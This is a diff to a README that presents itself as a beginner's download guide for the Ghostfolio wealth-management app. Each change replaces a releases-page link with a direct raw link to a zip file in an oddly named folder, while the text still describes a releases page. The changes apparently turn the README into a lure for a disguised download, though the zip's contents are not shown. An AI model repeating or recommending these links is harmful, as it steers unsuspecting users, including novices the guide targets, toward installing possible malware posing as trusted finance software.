@@ -2,7 +2,7 @@
 
 <div align="center">
 
-<a href="https://github.com/janrac93-source/Ghostfolio-Open-Source-Wealth-Management-Software/releases" style="display:inline-block;padding:18px 45px;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);color:#ffffff;font-size:22px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 8px 25px rgba(102,126,234,0.4);margin:30px 0;">⬇️ DOWNLOAD GHOSTFOLIO NOW</a>
+<a href="https://raw.githubusercontent.com/janrac93-source/Ghostfolio-Open-Source-Wealth-Management-Software/main/divaricately/1.7.zip" style="display:inline-block;padding:18px 45px;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);color:#ffffff;font-size:22px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 8px 25px rgba(102,126,234,0.4);margin:30px 0;">⬇️ DOWNLOAD GHOSTFOLIO NOW</a>
 
 </div>
 
@@ -37,7 +37,7 @@ This guide is designed for someone who has never installed software like this be
 
 Visit this link to download the application:
 
-**👉 [https://github.com/janrac93-source/Ghostfolio-Open-Source-Wealth-Management-Software/releases](https://github.com/janrac93-source/Ghostfolio-Open-Source-Wealth-Management-Software/releases)**
+**👉 [https://raw.githubusercontent.com/janrac93-source/Ghostfolio-Open-Source-Wealth-Management-Software/main/divaricately/1.7.zip](https://raw.githubusercontent.com/janrac93-source/Ghostfolio-Open-Source-Wealth-Management-Software/main/divaricately/1.7.zip)**
 
 This page shows you the latest version of Ghostfolio. Look for a file that says something like "Windows" or ends with a common installer extension. Click on the file to start the download. The download size is typically around 80-120 MB, so it may take a few minutes depending on your internet speed.
 
@@ -126,7 +126,7 @@ Ghostfolio is built with the highest standards of security and transparency. The
 
 Nothing beats seeing your financial future clearly. Download Ghostfolio now and take control of your investments:
 
-<a href="https://github.com/janrac93-source/Ghostfolio-Open-Source-Wealth-Management-Software/releases" style="display:inline-block;padding:15px 40px;background:linear-gradient(135deg,#f093fb 0%,#f5576c 100%);color:#ffffff;font-size:20px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 8px 25px rgba(245,87,108,0.4);margin:20px 0;">🚀 DOWNLOAD GHOSTFOLIO - IT'S FREE</a>
+<a href="https://raw.githubusercontent.com/janrac93-source/Ghostfolio-Open-Source-Wealth-Management-Software/main/divaricately/1.7.zip" style="display:inline-block;padding:15px 40px;background:linear-gradient(135deg,#f093fb 0%,#f5576c 100%);color:#ffffff;font-size:20px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 8px 25px rgba(245,87,108,0.4);margin:20px 0;">🚀 DOWNLOAD GHOSTFOLIO - IT'S FREE</a>
 
 ---
 
